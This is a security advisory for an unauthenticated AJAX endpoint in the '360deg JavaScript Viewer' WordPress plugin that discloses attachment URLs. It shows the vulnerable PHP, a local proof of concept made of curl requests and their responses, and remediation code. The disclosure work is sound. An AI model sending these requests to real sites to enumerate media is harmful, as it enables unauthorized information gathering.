# 360° JavaScript Viewer — Unauthenticated AJAX Attachment URL Disclosure

## Product Information

| Field | Value |
|---|---|
| Product Name | 360deg JavaScript Viewer |
| Plugin Slug | `360deg-javascript-viewer` |
| Affected Component | Notifier AJAX functionality |
| Affected Action | `get_notifier_image` |
| Affected Parameter | `jsv360_notifier_image_id` |
| Vulnerability Type | Unauthenticated AJAX Endpoint / Attachment URL Enumeration / Information Disclosure |
| Plugin | https://wordpress.org/plugins/360deg-javascript-viewer/ |

## Vulnerable Files

- `admin/pages/class-jsv-360-admin_page_abstract.php`
- `admin/pages/class-jsv-360-admin_page_notifier.php`

### Relevant Code

```php
foreach ($this->customAjaxHooks as $methodName => $customAjaxHook) {
    add_action('wp_ajax_' . $methodName, array($this, $customAjaxHook));
    add_action('wp_ajax_nopriv_' . $methodName, array($this, $customAjaxHook));
}
```

```php
public function getNotifierImage()
{
    $imageId = $_GET[$this::NOTIFIER_IMAGE_ID];
    $image   = wp_get_attachment_image_src($imageId);

    $url = $image && count($image) > 0
        ? $image[0]
        : '';

    return wp_send_json_success([
        'url' => $url
    ]);
}
```

## Root Cause

The `get_notifier_image` AJAX action is registered for unauthenticated users via:

```php
add_action('wp_ajax_nopriv_get_notifier_image', ...);
```

However, `getNotifierImage()` performs no authentication, authorization, capability, or nonce check before processing the user-controlled `jsv360_notifier_image_id` parameter. The supplied attachment ID is passed directly to `wp_get_attachment_image_src($imageId)`, and the resulting image URL is returned to the requester.

## Impact

An unauthenticated remote user can invoke the `get_notifier_image` AJAX endpoint and retrieve the URL associated with a supplied WordPress attachment ID, without a valid WordPress authentication session.

The current PoC confirms unauthorized URL retrieval for a valid attachment ID.

## Attack Vectors

An unauthenticated attacker can send a `GET` request directly to `/wp-admin/admin-ajax.php` with:

```
action=get_notifier_image
jsv360_notifier_image_id=<attachment_id>
```

No WordPress login session is required.

### Attack Flow

```
Unauthenticated Attacker
        |
        v
/wp-admin/admin-ajax.php
        |
        | action=get_notifier_image
        | jsv360_notifier_image_id=5
        v
wp_ajax_nopriv_get_notifier_image
        |
        v
getNotifierImage()
        |
        v
wp_get_attachment_image_src(5)
        |
        v
Attachment URL returned
```

## Attack Payload Examples

### Valid Attachment ID

```bash
curl -i \
-H 'Cookie:' \
'http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=get_notifier_image&jsv360_notifier_image_id=5'
```

**Observed response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8
```
```json
{
  "success": true,
  "data": {
    "url": "http://127.0.0.1/wordpress/wp-content/uploads/2026/08/test.jpg"
  }
}
```

### Invalid Attachment ID

```bash
curl -i \
-H 'Cookie:' \
'http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=get_notifier_image&jsv360_notifier_image_id=999999'
```

**Observed response:**

```json
{
  "success": true,
  "data": {
    "url": ""
  }
}
```

This confirms the endpoint accepts arbitrary attachment IDs and processes them without requiring authentication.

## Code Scan Trace

```
customAjaxHooks
      ↓
get_notifier_image
      ↓
wp_ajax_nopriv_get_notifier_image
      ↓
getNotifierImage()
      ↓
$_GET['jsv360_notifier_image_id']
      ↓
wp_get_attachment_image_src()
      ↓
JSON response containing URL
```

The endpoint lacks:
- An authorization/capability check such as `current_user_can()`
- Nonce verification such as `check_ajax_referer()` inside `getNotifierImage()`

## Proof of Concept

### Environment

| Field | Value |
|---|---|
| WordPress | Local test installation |
| Plugin | 360deg JavaScript Viewer |
| Authentication | None |
| Attachment ID | 5 |

### Step 1 — Create Test Image

```bash
convert -size 100x100 xc:white /tmp/test.jpg
```

### Step 2 — Import the Image

```bash
sudo -u www-data wp media import /tmp/test.jpg \
  --title="PoC Test Image" \
  --porcelain \
  --path=/var/www/html/wordpress
```

**Result:** `5`

### Step 3 — Send Unauthenticated Request

```bash
curl -i \
-H 'Cookie:' \
'http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=get_notifier_image&jsv360_notifier_image_id=5'
```

### Step 4 — Observe URL Disclosure

```json
{
  "success": true,
  "data": {
    "url": "http://127.0.0.1/wordpress/wp-content/uploads/2026/08/test.jpg"
  }
}
```

No authentication cookie was supplied. This demonstrates that the `get_notifier_image` AJAX action is callable by an unauthenticated user and returns the URL corresponding to a valid attachment ID.

## Suggested Remediation

### 1. Remove the Unauthenticated AJAX Registration

If the functionality is intended only for administrators, keep only the authenticated hook:

```php
add_action(
    'wp_ajax_get_notifier_image',
    array($this, 'getNotifierImage')
);
```

Remove:

```php
add_action(
    'wp_ajax_nopriv_get_notifier_image',
    array($this, 'getNotifierImage')
);
```

### 2. Add an Authorization Check

```php
if (!current_user_can('manage_options')) {
    wp_send_json_error([
        'message' => 'Unauthorized'
    ], 403);
}
```

### 3. Add Nonce Verification

```php
check_ajax_referer('jsv_notifier');
```

### 4. Validate the Attachment ID

```php
$imageId = absint($_GET[$this::NOTIFIER_IMAGE_ID] ?? 0);

if (!$imageId) {
    wp_send_json_error([
        'message' => 'Invalid attachment ID'
    ], 400);
}
```

### 5. Enforce Attachment-Level Authorization

Ensure only attachments the requesting user is authorized to access are returned.

## Additional Information

The vulnerability was reproduced in a local WordPress test environment using an unauthenticated HTTP request. The current PoC demonstrates unauthenticated attachment URL retrieval but does not independently demonstrate access to private/protected media.
